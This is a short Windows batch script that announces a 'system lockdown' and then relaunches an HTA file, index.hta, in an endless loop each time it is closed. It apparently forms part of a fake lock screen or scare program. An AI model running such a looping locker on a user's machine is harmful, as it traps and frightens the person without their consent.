@echo off
cls

echo Initiating system lockdown...
echo Lockdown mode is now active.

:open
start "" /wait "index.hta"
goto :open
